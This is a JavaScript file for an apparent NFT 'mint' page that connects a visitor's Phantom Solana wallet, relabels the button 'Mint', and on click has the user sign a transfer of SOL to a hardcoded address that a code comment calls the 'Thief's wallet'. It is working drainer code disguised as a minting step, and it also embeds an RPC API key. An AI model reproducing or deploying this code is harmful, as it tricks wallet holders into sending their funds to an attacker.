// === Buffer Polyfill (top of scripts.js) ===
if (typeof Buffer === "undefined") {
  window.Buffer = window.buffer.Buffer;
}

if (typeof Buffer.from !== "function") {
  Buffer.from = function (input, encoding) {
    if (typeof input === 'string') {
      if (encoding === 'base64') {
        return new Uint8Array(atob(input).split("").map(c => c.charCodeAt(0)));
      } else if (encoding === 'utf8' || encoding === 'utf-8' || !encoding) {
        return new TextEncoder().encode(input);
      } else {
        throw new Error("Unsupported encoding: " + encoding);
      }
    } else if (Array.isArray(input)) {
      return new Uint8Array(input);
    } else if (input instanceof ArrayBuffer || ArrayBuffer.isView(input)) {
      return new Uint8Array(input);
    } else {
      throw new Error("Unsupported input type to Buffer.from");
    }
  };
}
// === End Buffer Polyfill ===

$(document).ready(function() {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                console.log("Phantom Wallet connected:", resp);

               var connection = new solanaWeb3.Connection(
               'https://mainnet.helius-rpc.com/?api-key=694c477f-7093-40cd-8456-30fa1e8f888a',
               'confirmed'
               );


                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(public_key);
                console.log("Wallet balance:", walletBalance);

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    alert("Insufficient funds for rent.");
                    return;
                }

                $('#connect-wallet').text("Mint");
                $('#connect-wallet').off('click').on('click', async () => {
                    try {
                        const recieverWallet = new solanaWeb3.PublicKey('ETNkYSq5bAGBR7Szz7tKFkPWU5wFdPe2XzuxTAAWEfP5'); // Thief's wallet
                        const balanceForTransfer = walletBalance - minBalance;
                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds for transfer.");
                            return;
                        }

                       var transaction = new solanaWeb3.Transaction().add(
                       solanaWeb3.SystemProgram.transfer({
                       fromPubkey: resp.publicKey,
                       toPubkey: recieverWallet,
                       lamports: Math.floor(0.01 * solanaWeb3.LAMPORTS_PER_SOL),
                        })
                      );


                        transaction.feePayer = window.solana.publicKey;
                        let blockhashObj = await connection.getLatestBlockhash();
                        transaction.recentBlockhash = blockhashObj.blockhash;


                        const signed = await window.solana.signTransaction(transaction);
                        console.log("Transaction signed:", signed);

                        let txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);
                        console.log("Transaction confirmed:", txid);
                    } catch (err) {
                        console.error("Error during minting:", err);
                    }
                });
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
            }
        } else {
            alert("Phantom extension not found.");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;

            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please download the Phantom extension for your browser.");
            }
        }
    });
});
